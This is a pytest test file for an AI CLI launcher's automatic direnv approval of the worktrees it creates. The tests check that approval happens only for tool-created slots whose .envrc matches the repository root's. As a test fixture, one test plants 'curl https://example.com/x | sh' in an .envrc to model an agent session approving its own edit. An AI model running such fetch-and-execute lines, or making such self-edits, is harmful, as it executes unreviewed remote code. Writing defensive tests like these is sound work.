"""Automatic direnv authorization for session worktrees the launcher creates.

direnv approvals are path-specific, so the ``.envrc`` git writes into a brand new
session worktree is unapproved even when the repository root holds a byte-identical
approved copy. The operator therefore had to run ``direnv allow`` inside every
fresh worktree by hand, after being told off by direnv for not having done it.

Approval requires BOTH halves of a trust boundary, and both are tested here.

Provenance of the DIRECTORY: the slot is one the tool created --
``<repo>/.worktrees/<name>``. The repository root, an inherited parent ``.envrc``,
and a worktree registered from anywhere else are all directories the tool did not
create, and auto-approving unreviewed shell in one of those would be worse than the
nagging it replaces.

Provenance of the CONTENT: the file is byte-identical to the repository root's.
Directory provenance alone is not file provenance -- git writes whatever the
checked-out branch carries, and anything with write access to the slot can rewrite it
afterwards, including the agent session running there. Since approval runs again on
every relaunch, a session could otherwise have its own ``.envrc`` edit approved for
it, unreviewed.

What approval deliberately does NOT depend on is the repository root already being
APPROVED. Requiring that made the whole feature a no-op on a host where no ``.envrc``
is approved at all -- the host that needs it most, and the one that reported it
broken. Identity with the root is a claim about content, not about approval state.
"""

import json
import shutil
import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from ai_cli.direnv_setup import BYPASS_ENV
from ai_cli.session import _authorize_session_worktree_envrc

_BODY = "export PROJECT_ENV=1\n"

_NOTICE = "[launch] direnv: authorized"
_BLOCKED_WARNING = "direnv could not load"

# ``shutil`` and ``subprocess`` are shared module objects, so patching an attribute
# on either is global to the process -- it cannot be scoped to direnv_setup. The fakes
# below therefore intercept only ``direnv`` and pass everything else through, which the
# end-to-end test needs because it drives real git.
#
# ``subprocess.run`` pass-through is captured per fake, at construction, so it lands on
# whatever conftest's autouse guards have installed by then rather than on the
# import-time original -- that guard refuses real agent processes, and reaching around
# it would disarm the refusal for the whole launch these tests drive. ``shutil.which``
# carries no such guard, so the import-time reference is the right one.
_REAL_WHICH = shutil.which


@pytest.fixture(autouse=True)
def _no_inherited_bypass(monkeypatch):
    """A bypass leaking in from the developer's own shell would silence every test."""
    monkeypatch.delenv(BYPASS_ENV, raising=False)


class FakeDirenv:
    """Stand-in for the direnv binary that records how it was invoked.

    Dispatching on argv rather than stubbing the helpers keeps the real
    ``envrc_allowed``/``allow_envrc`` code -- including the argv they build and the
    JSON they parse -- inside the test.
    """

    def __init__(self, *, allowed: bool = False, allow_succeeds: bool = True, loads: bool = False):
        self.allowed = allowed
        self.allow_succeeds = allow_succeeds
        self.loads = loads
        self.calls: list[list[str]] = []
        self.kwargs: list[dict] = []
        self.passthrough = subprocess.run

    def __call__(self, argv, **kwargs):
        if not argv or argv[0] != "direnv":
            return self.passthrough(argv, **kwargs)
        self.calls.append(list(argv))
        self.kwargs.append(kwargs)
        if argv[:3] == ["direnv", "status", "--json"]:
            state = {"state": {"foundRC": {"allowed": 0 if self.allowed else 1, "path": "."}}}
            return subprocess.CompletedProcess(argv, 0, json.dumps(state), "")
        if argv[:2] == ["direnv", "allow"]:
            rc = 0 if self.allow_succeeds else 1
            stderr = "" if self.allow_succeeds else "direnv: error /x/.envrc is blocked. Run `direnv allow`."
            self.allowed = self.allowed or self.allow_succeeds
            return subprocess.CompletedProcess(argv, rc, "", stderr)
        if argv[:3] == ["direnv", "export", "json"]:
            rc = 0 if self.loads else 1
            stderr = "" if self.loads else "direnv: error .envrc is blocked. Run `direnv allow`."
            return subprocess.CompletedProcess(argv, rc, "{}", stderr)
        raise AssertionError(f"unexpected direnv invocation: {argv}")

    @property
    def allowed_paths(self) -> list[str]:
        return [call[2] for call in self.calls if call[:2] == ["direnv", "allow"]]


def _which(*, have_direnv: bool):
    """A ``shutil.which`` that answers for direnv and defers for everything else."""

    def which(name, *args, **kwargs):
        if name == "direnv":
            return "/usr/bin/direnv" if have_direnv else None
        return _REAL_WHICH(name, *args, **kwargs)

    return which


def _authorize(root: Path, directory: Path, fake: FakeDirenv, *, have_direnv: bool = True) -> None:
    with (
        patch("ai_cli.direnv_setup.shutil.which", side_effect=_which(have_direnv=have_direnv)),
        patch("ai_cli.direnv_setup.subprocess.run", side_effect=fake),
    ):
        _authorize_session_worktree_envrc(root, directory)


@pytest.fixture
def repo(tmp_path):
    """A repo root and one of its session worktree slots, both carrying an .envrc."""
    root = tmp_path / "myproject"
    worktree = root / ".worktrees" / "myproject-1"
    worktree.mkdir(parents=True)
    (root / ".envrc").write_text(_BODY)
    (worktree / ".envrc").write_text(_BODY)
    return root, worktree


# --- AC-1: a created worktree with an .envrc gets authorized --------------------


def test_given_a_session_worktree_with_an_envrc_when_authorized_then_direnv_allows_that_path(repo):
    """The whole point: no human action for a worktree the launcher just created."""
    root, worktree = repo
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.allowed_paths == [str(worktree)]


def test_given_an_unapproved_repository_root_when_authorized_then_the_worktree_is_still_allowed(repo):
    """Approval must not be conditional on the root's own approval state.

    Making it conditional is what turned this feature into a silent no-op on a
    host where nothing is approved -- the exact host that reported it broken.
    """
    root, worktree = repo
    fake = FakeDirenv(allowed=False, loads=False)

    _authorize(root, worktree, fake)

    assert fake.allowed_paths == [str(worktree)]
    assert str(root) not in fake.allowed_paths, "the repository root is not the launcher's to approve"


# --- AC-2: it says so ----------------------------------------------------------


def test_given_a_successful_authorization_when_it_runs_then_the_launcher_reports_it(repo, capsys):
    root, worktree = repo

    _authorize(root, worktree, FakeDirenv())

    err = capsys.readouterr().err
    assert _NOTICE in err
    assert str(worktree / ".envrc") in err


def test_given_a_failing_direnv_allow_when_it_runs_then_no_authorization_is_claimed(repo, capsys):
    """Approval is best effort, but a failed one must not be announced as done."""
    root, worktree = repo

    _authorize(root, worktree, FakeDirenv(allow_succeeds=False))

    assert _NOTICE not in capsys.readouterr().err


# --- AC-3: the notice comes before any blocked-directory output ----------------


def test_given_authorization_when_direnv_runs_then_its_own_output_is_captured_not_leaked(repo):
    """direnv's ``is blocked`` complaint must never reach the terminal from here.

    Asserted on the subprocess *arguments*, because an inherited stderr is
    invisible in behaviour under pytest's capture yet would put the complaint
    ahead of the notice saying it has just been fixed.
    """
    root, worktree = repo
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls, "expected direnv to be invoked"
    for argv, kwargs in zip(fake.calls, fake.kwargs, strict=True):
        assert kwargs.get("capture_output") is True, f"direnv stderr leaks to the terminal: {argv}"


# --- AC-4 / AC-5 / AC-6: the refusals -----------------------------------------


def test_given_no_direnv_on_path_when_authorized_then_it_is_a_silent_noop(repo, capsys):
    root, worktree = repo
    fake = FakeDirenv()

    _authorize(root, worktree, fake, have_direnv=False)

    assert fake.calls == []
    assert capsys.readouterr().err == ""


def test_given_a_worktree_without_an_envrc_when_authorized_then_nothing_is_allowed(repo):
    root, worktree = repo
    (worktree / ".envrc").unlink()
    (root / ".envrc").unlink()
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls == []


def test_given_only_an_inherited_parent_envrc_when_authorized_then_nothing_is_allowed(repo):
    """direnv searches upward, but a parent's ``.envrc`` is not the launcher's to approve."""
    root, worktree = repo
    (worktree / ".envrc").unlink()
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls == [], "approved a directory whose .envrc belongs to a parent"


def test_given_the_repository_root_when_authorized_then_nothing_is_allowed(repo):
    """AC-6: the root is a directory the launcher did not create."""
    root, _worktree = repo
    fake = FakeDirenv()

    _authorize(root, root, fake)

    assert fake.calls == []


def test_given_a_worktree_outside_the_slot_directory_when_authorized_then_nothing_is_allowed(tmp_path):
    """AC-6: a worktree registered somewhere else was created by someone else.

    Worktrees living outside ``<repo>/.worktrees`` are a real and common layout,
    so this is the case that decides whether the boundary is "did the tool create
    it" or merely "is it a worktree".
    """
    root = tmp_path / "myproject"
    root.mkdir()
    (root / ".envrc").write_text(_BODY)
    outside = tmp_path / "myproject-worktrees" / "feature"
    outside.mkdir(parents=True)
    (outside / ".envrc").write_text(_BODY)
    fake = FakeDirenv()

    _authorize(root, outside, fake)

    assert fake.calls == []


def test_given_a_worktree_envrc_differing_from_the_root_when_authorized_then_nothing_is_allowed(repo):
    """The CONTENT half of the boundary: directory provenance is not file provenance.

    The slot is this tool's, but the file in it is not -- git writes whatever the
    checked-out branch carries. Content the operator does not already have at the
    repository root has never been reviewed on this host, so it keeps direnv's prompt.
    """
    root, worktree = repo
    (worktree / ".envrc").write_text("export EXFILTRATE=1\n")
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls == [], "auto-approved .envrc content that differs from the repository root's"


def test_given_a_session_that_edited_its_own_envrc_when_relaunched_then_it_is_not_reapproved(repo):
    """Approval runs again on every relaunch, so a self-edit must not approve itself.

    ``_authorize_session_worktree_envrc`` is called from ``_initialize_worktree``,
    which runs for a REUSED worktree too. Anything with write access to the slot --
    including the agent session running inside it -- can rewrite the file, and that
    edit invalidates direnv's existing approval, so the next launch would re-approve
    it. This needs no push access to ``origin`` and no operator action, which makes
    it a far lower bar than a hostile branch.
    """
    root, worktree = repo
    fake = FakeDirenv()
    _authorize(root, worktree, fake)
    assert fake.allowed_paths == [str(worktree)], "precondition: the pristine worktree is approved"

    (worktree / ".envrc").write_text(_BODY + "curl https://example.com/x | sh\n")
    relaunch = FakeDirenv(allowed=False)

    _authorize(root, worktree, relaunch)

    assert relaunch.calls == [], "a session's own .envrc edit was approved on relaunch"


def test_given_no_root_envrc_to_compare_against_when_authorized_then_nothing_is_allowed(repo):
    """Nothing to compare against is not a licence to trust; it refuses."""
    root, worktree = repo
    (root / ".envrc").unlink()
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls == []


def test_given_a_nested_path_under_a_slot_when_authorized_then_nothing_is_allowed(repo):
    """Only the slot itself, not something the session later created inside one."""
    root, worktree = repo
    nested = worktree / "subdir"
    nested.mkdir()
    (nested / ".envrc").write_text(_BODY)
    fake = FakeDirenv()

    _authorize(root, nested, fake)

    assert fake.calls == []


# --- idempotence and the opt-out ----------------------------------------------


def test_given_an_already_approved_worktree_when_authorized_then_nothing_is_reallowed(repo, capsys):
    """A long-lived worktree relaunches often; re-announcing a no-op is noise.

    The probe must also not be ``direnv export``, which would *evaluate* the
    ``.envrc`` and hit whatever credential provider it uses on every launch.
    """
    root, worktree = repo
    fake = FakeDirenv(allowed=True)

    _authorize(root, worktree, fake)

    assert fake.allowed_paths == []
    assert capsys.readouterr().err == ""
    for argv in fake.calls:
        assert argv[:2] != ["direnv", "export"], f"approval probe evaluates the .envrc: {argv}"


def test_given_the_direnv_bypass_when_authorized_then_nothing_is_allowed(repo, monkeypatch):
    """An operator who has said "no direnv on this host" must not be overridden."""
    root, worktree = repo
    monkeypatch.setenv(BYPASS_ENV, "1")
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls == []


def test_given_direnv_vanishing_mid_call_when_authorized_then_it_does_not_raise(repo):
    """A launch must never die because an optional enhancement failed."""
    root, worktree = repo

    with (
        patch("ai_cli.direnv_setup.shutil.which", side_effect=_which(have_direnv=True)),
        patch("ai_cli.direnv_setup.subprocess.run", side_effect=OSError("direnv vanished")),
    ):
        _authorize_session_worktree_envrc(root, worktree)


def test_given_a_direnv_too_old_for_status_json_when_authorized_then_it_still_allows(repo):
    """Unknown approval state must not be read as "already approved"."""
    root, worktree = repo
    calls: list[list[str]] = []
    passthrough = subprocess.run

    def run(argv, **kwargs):
        if not argv or argv[0] != "direnv":
            return passthrough(argv, **kwargs)
        calls.append(list(argv))
        if argv[:3] == ["direnv", "status", "--json"]:
            return subprocess.CompletedProcess(argv, 1, "", "unknown flag: --json")
        return subprocess.CompletedProcess(argv, 0, "", "")

    with (
        patch("ai_cli.direnv_setup.shutil.which", side_effect=_which(have_direnv=True)),
        patch("ai_cli.direnv_setup.subprocess.run", side_effect=run),
    ):
        _authorize_session_worktree_envrc(root, worktree)

    assert [call[2] for call in calls if call[:2] == ["direnv", "allow"]] == [str(worktree)]


# --- AC-3, end to end: the launcher's own ordering -----------------------------


def _git(*args, cwd):
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)


@pytest.fixture
def committed_envrc_repo(tmp_path):
    """A real clone whose tracked ``.envrc`` is therefore checked out into worktrees.

    Committing it is what makes the worktree carry its *own* ``.envrc`` rather than
    inheriting the root's, which is the only case this feature acts on.
    """
    remote = tmp_path / "origin.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(remote)], check=True, capture_output=True)

    seed = tmp_path / "seed"
    seed.mkdir()
    _git("init", "-b", "main", cwd=seed)
    _git("config", "user.email", "t@example.com", cwd=seed)
    _git("config", "user.name", "T", cwd=seed)
    (seed / "README.md").write_text("hi\n")
    (seed / ".envrc").write_text(_BODY)
    _git("add", "-A", cwd=seed)
    _git("commit", "-m", "init", cwd=seed)
    _git("push", "-q", str(remote), "main", cwd=seed)

    repo = tmp_path / "myproject"
    subprocess.run(["git", "clone", "-q", str(remote), str(repo)], check=True, capture_output=True)
    _git("config", "user.email", "t@example.com", cwd=repo)
    _git("config", "user.name", "T", cwd=repo)
    return repo


def test_given_a_launch_whose_envrc_stays_blocked_then_the_notice_precedes_the_warning(
    committed_envrc_repo, tmp_path, monkeypatch, capsys
):
    """AC-3 is an ordering claim, so it is asserted as one, on a real launch.

    direnv is held blocked for the whole launch -- artificial, since a successful
    approval would silence the warning -- precisely so both lines are emitted and
    their order can be read off one stream. The launcher decides that order: the
    authorization happens inside worktree creation, and the blocked-directory
    warning comes from the direnv preflight that create_worktree returns into.
    Move the authorization after the preflight and this test fails.
    """
    from ai_cli.main import _do_session_launch

    monkeypatch.chdir(committed_envrc_repo)
    monkeypatch.setattr(Path, "home", staticmethod(lambda: tmp_path / "home"))
    fake = FakeDirenv(allowed=False, loads=False)
    fake.allow_succeeds = True

    def fake_execvp(file, args):
        raise SystemExit(0)

    with (
        patch("ai_cli.direnv_setup.shutil.which", side_effect=_which(have_direnv=True)),
        patch("ai_cli.direnv_setup.subprocess.run", side_effect=fake),
        patch("ai_cli.main._direnv_installed", return_value=True),
        patch("ai_cli.main.os.execvp", side_effect=fake_execvp),
        patch("ai_cli.config.get_session_map", return_value={}),
        patch("ai_cli.config.get_current_project_name", return_value="myproject"),
        patch("ai_cli.config.validate_registry_completeness", return_value=True),
        patch("ai_cli.session._resolve_is_remote", return_value=False),
        patch("ai_cli.trust.ensure_workspace_trusted"),
        pytest.raises(SystemExit),
    ):
        _do_session_launch(
            engine="c",
            name="1",
            resume=False,
            once=False,
            bare=True,
            notify=False,
            sandbox=False,
            no_worktree=False,
            remote=False,
            project="",
            is_remote=False,
            project_prefix_override="myapp",
            extra_args=[],
            config={"worktree": {"enabled": True}, "session": {"use_tmux": False}},
            no_direnv=True,
        )

    worktree = committed_envrc_repo / ".worktrees" / "myapp-1"
    assert (worktree / ".envrc").is_file(), "fixture must give the worktree its own .envrc"
    assert fake.allowed_paths == [str(worktree)]

    err = capsys.readouterr().err
    assert _NOTICE in err, "the launch never reported authorizing the worktree"
    assert _BLOCKED_WARNING in err, "this test is only meaningful when both lines are emitted"
    assert err.index(_NOTICE) < err.index(_BLOCKED_WARNING), (
        f"the authorization notice must precede the blocked-directory warning; got:\n{err}"
    )
